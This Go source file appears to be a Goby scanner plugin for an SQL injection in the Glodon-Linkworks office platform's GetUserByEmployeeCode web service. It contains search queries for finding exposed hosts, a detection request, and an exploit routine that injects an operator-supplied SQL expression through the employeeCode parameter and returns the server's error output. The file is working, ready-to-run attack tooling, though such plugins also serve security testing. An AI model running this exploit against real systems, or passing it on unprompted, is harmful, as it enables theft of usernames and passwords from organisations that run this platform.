package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Glodon-Linkworks GetUserByEmployeeCode employeeCode SQL Injection Vulnerability",
    "Description": "<p>Glodon-Linkworks collaborative office management platform is a management system that focuses on the entire life cycle of engineering projects and provides customers with digital software and hardware products and solutions.</p><p>Glodon-Linkworks collaborative office management platform GetUserByEmployeeCode has a SQL injection vulnerability, and attackers can obtain sensitive information such as usernames and passwords.</p>",
    "Product": "Glodon-Linkworks",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2023-02-13",
    "Author": "h1ei1",
    "FofaQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "GobyQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "Level": "2",
    "Impact": "<p>Glodon-Linkworks collaborative office management platform GetUserByEmployeeCode has a SQL injection vulnerability, and attackers can obtain sensitive information such as usernames and passwords.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.glodon.com/.\">https://www.glodon.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "user",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Org/service/Service.asmx/GetUserByEmployeeCode",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "employeeCode=1'-1/user--'&EncryptData=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "在将 nvarchar 值",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "转换成数据类型 int 时失败",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Org/service/Service.asmx/GetUserByEmployeeCode",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "employeeCode=1'-1/{{{sql}}}--'&EncryptData=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "广联达-Linkworks 协同办公管理平台 GetUserByEmployeeCode 文件 employeeCode 参数 SQL注入漏洞",
            "Product": "广联达-Linkworks协同办公管理平台",
            "Description": "<p>广联达-Linkworks协同办公管理平台是一款围绕工程项目的全生命周期,为客户提供数字化软硬件产品、解决方案的管理系统。<br></p><p>广联达-Linkworks协同办公管理平台 GetUserByEmployeeCode存在 SQL注入漏洞，攻击者可获取用户名密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时更新：<a href=\"https://www.glodon.com/\">https://www.glodon.com/</a>。<br></p>",
            "Impact": "<p>广联达-Linkworks协同办公管理平台 GetUserByEmployeeCode 存在 SQL注入漏洞，攻击者可获取用户名密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Glodon-Linkworks GetUserByEmployeeCode employeeCode SQL Injection Vulnerability",
            "Product": "Glodon-Linkworks",
            "Description": "<p>Glodon-Linkworks collaborative office management platform is a management system that focuses on the entire life cycle of engineering projects and provides customers with digital software and hardware products and solutions.<br></p><p>Glodon-Linkworks collaborative office management platform GetUserByEmployeeCode has a SQL injection vulnerability, and attackers can obtain sensitive information such as usernames and passwords.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.glodon.com/.\">https://www.glodon.com/.</a><br></p>",
            "Impact": "<p>Glodon-Linkworks collaborative office management platform GetUserByEmployeeCode has a SQL injection vulnerability, and attackers can obtain sensitive information such as usernames and passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-06",
    "PocId": "10803"
}`

	sendPayloadFlag8xhq := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/Org/service/Service.asmx/GetUserByEmployeeCode")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = `employeeCode=1'-1/` + sql + `--'&EncryptData=1`
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				// SQL 注入
				rsp, err := sendPayloadFlag8xhq(expResult.HostInfo, goutils.B2S(ss.Params["sql"]))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if rsp != nil && rsp.StatusCode == 500 {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
			} else if attackType == "sqlPoint" {
				// 发起扫描请求，判断漏洞是否存在
				rsp, err := sendPayloadFlag8xhq(expResult.HostInfo, "user")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if rsp != nil && strings.Contains(rsp.Utf8Html, "在将 nvarchar 值") && strings.Contains(rsp.Utf8Html, "转换成数据类型 int 时失败") {
					expResult.Success = true
					expResult.Output = `POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

employeeCode=1'-1/user--'&EncryptData=1`
				}
			}
			return expResult
		},
	))
}
